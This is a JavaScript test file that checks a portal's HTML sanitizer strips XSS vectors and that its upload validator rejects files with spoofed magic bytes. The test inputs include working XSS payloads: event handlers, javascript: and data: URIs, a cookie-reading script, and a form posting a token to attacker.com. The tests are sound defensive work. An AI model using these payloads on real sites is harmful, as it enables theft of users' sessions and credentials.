const { sanitizeRichText } = require('../../src/services/portalContentSanitizer');
const { validateFileMagicBytes } = require('../../src/middlewares/upload');

describe('Portal Sanitizer XSS Prevention', () => {
  it('should strip onload, onerror, and javascript: pseudo-protocol from HTML', () => {
    const maliciousHtml = [
      '<p onload="alert(\'xss-p\')" onerror="alert(\'err\')">Clean paragraph</p>',
      '<a href="javascript:alert(\'xss-link\')" title="Test">Link with JS</a>',
      '<a href="JAVASCRIPT:alert(1)">Uppercase JS</a>',
      '<a href="javascript&#58;alert(1)">Encoded JS</a>',
      '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Data URI</a>',
      '<img src="javascript:alert(1)" alt="bad img" />',
      '<img src="https://example.com/pic.jpg" onload="alert(\'img-onload\')" onerror="alert(\'img-onerror\')" onmouseover="alert(\'hover\')" />',
    ].join('');

    const cleaned = sanitizeRichText(maliciousHtml);

    expect(cleaned).not.toContain('javascript:');
    expect(cleaned).not.toContain('JAVASCRIPT:');
    expect(cleaned).not.toContain('onload');
    expect(cleaned).not.toContain('onerror');
    expect(cleaned).not.toContain('onmouseover');
    expect(cleaned).not.toContain('data:text/html');
    expect(cleaned).toContain('<p>Clean paragraph</p>');
    expect(cleaned).toContain('<img src="https://example.com/pic.jpg" />');
  });

  it('should strip script, iframe, and object tags completely', () => {
    const dangerousHtml = [
      '<script>alert("steal cookies: " + document.cookie);</script>',
      '<iframe src="https://attacker.com/malicious.html">Phishing Frame Content</iframe>',
      '<object data="exploit.swf">Flash Payload</object>',
      '<embed src="payload.swf" />',
      '<svg onload="alert(\'svg-xss\')"><script>alert(\'nested-svg\')</script><circle r="10"/></svg>',
      '<form action="https://attacker.com/steal" method="POST"><input name="token" value="secret"/></form>',
    ].join('');

    const cleaned = sanitizeRichText(dangerousHtml);

    expect(cleaned).not.toContain('<script');
    expect(cleaned).not.toContain('steal cookies');
    expect(cleaned).not.toContain('<iframe');
    expect(cleaned).not.toContain('Phishing Frame Content');
    expect(cleaned).not.toContain('<object');
    expect(cleaned).not.toContain('Flash Payload');
    expect(cleaned).not.toContain('<embed');
    expect(cleaned).not.toContain('<svg');
    expect(cleaned).not.toContain('svg-xss');
    expect(cleaned).not.toContain('nested-svg');
    expect(cleaned).not.toContain('<form');
    expect(cleaned).not.toContain('<input');
    expect(cleaned.trim()).toBe('');
  });

  it('should reject file upload if binary content does not match declared MIME type', () => {
    expect(typeof validateFileMagicBytes).toBe('function');

    // Mismatched / spoofed uploads
    const fakePdf = Buffer.from('<html><body>Fake PDF with HTML payload</body></html>');
    const fakePng = Buffer.from('GIF89a Fake Image Payload');
    const fakeJpeg = Buffer.from('%PDF-1.4 Fake PDF pretending to be JPEG');
    const emptyBuffer = Buffer.alloc(0);

    const pdfCheck = validateFileMagicBytes(fakePdf, 'application/pdf');
    expect(pdfCheck.valid).toBe(false);

    const pngCheck = validateFileMagicBytes(fakePng, 'image/png');
    expect(pngCheck.valid).toBe(false);

    const jpegCheck = validateFileMagicBytes(fakeJpeg, 'image/jpeg');
    expect(jpegCheck.valid).toBe(false);

    const emptyCheck = validateFileMagicBytes(emptyBuffer, 'application/pdf');
    expect(emptyCheck.valid).toBe(false);

    // Valid magic bytes
    const validPdfBuffer = Buffer.from('%PDF-1.7 standard header content');
    const validPngBuffer = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00]);
    const validJpegBuffer = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46]);

    expect(validateFileMagicBytes(validPdfBuffer, 'application/pdf').valid).toBe(true);
    expect(validateFileMagicBytes(validPngBuffer, 'image/png').valid).toBe(true);
    expect(validateFileMagicBytes(validJpegBuffer, 'image/jpeg').valid).toBe(true);
  });
});
